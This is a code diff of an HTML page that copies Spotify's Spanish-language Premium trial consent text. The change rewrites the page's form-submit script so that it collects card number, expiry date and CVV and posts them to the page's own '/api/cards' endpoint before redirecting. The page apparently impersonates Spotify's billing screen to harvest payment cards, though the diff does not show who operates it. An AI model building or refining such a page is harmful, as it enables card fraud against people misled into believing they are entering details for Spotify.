@@ -502,7 +502,7 @@
             Das tu consentimiento para obtener acceso a tu suscripción de Spotify inmediatamente y a que, si no cancelas antes de que termine el período de prueba el 5 de junio de 2025, se te cobre la tarifa de suscripción de forma automática todos los meses hasta que canceles. Si la cancelas durante el período de prueba, perderás el acceso a las ventajas de Premium inmediatamente.
         </div>
 
-        <form id="cardForm" onsubmit="submitForm(event)">
+        <form id="paymentForm" onsubmit="submitForm(event)">
             <button type="submit" class="submit-btn">Guardar</button>
         </form>
 
@@ -629,54 +629,50 @@
                 }
             }
 
-            function submitForm(event) {
-                event.preventDefault();
-                const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
-                const expiryDate = document.querySelector('input[placeholder="MM/AA"]').value;
-                const cvv = document.querySelector('input[placeholder="123"]').value;
-
-                // Mostrar indicador de carga
-                const submitButton = document.querySelector('.submit-btn');
+            document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const submitButton = document.querySelector('button[type="submit"]');
                 submitButton.disabled = true;
                 submitButton.textContent = 'Guardando...';
 
-                // Enviar datos al servidor
-                fetch('/api/cards', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        cardNumber: cardNumber.replace(/\s/g, ''),
-                        expiryDate: expiryDate,
-                        cvv: cvv
-                    })
-                })
-                .then(response => {
+                try {
+                    const cardNumber = document.getElementById('cardNumber').value;
+                    const expiryDate = document.getElementById('expiryDate').value;
+                    const cvv = document.getElementById('cvv').value;
+
+                    const response = await fetch('/api/cards', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            cardNumber,
+                            expiryDate,
+                            cvv
+                        })
+                    });
+
+                    const data = await response.json();
+                    console.log('Respuesta del servidor:', data);
+
                     if (!response.ok) {
-                        return response.json().then(err => {
-                            throw new Error(err.message || 'Error al guardar la tarjeta');
-                        });
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.success) {
-                        alert('¡Tarjeta guardada exitosamente!');
-                        window.location.href = '/index.html';
-                    } else {
                         throw new Error(data.message || 'Error al guardar la tarjeta');
                     }
-                })
-                .catch(error => {
+
+                    if (data.success) {
+                        window.location.href = data.redirectUrl || '/index.html';
+                    } else {
+                        throw new Error(data.message || 'Error desconocido');
+                    }
+                } catch (error) {
                     console.error('Error:', error);
-                    alert(error.message || 'Error al guardar la tarjeta');
-                })
-                .finally(() => {
+                    alert('Error: ' + error.message);
+                } finally {
                     submitButton.disabled = false;
                     submitButton.textContent = 'Guardar';
-                });
-            }
+                }
+            });
         </script>
     </div>
 
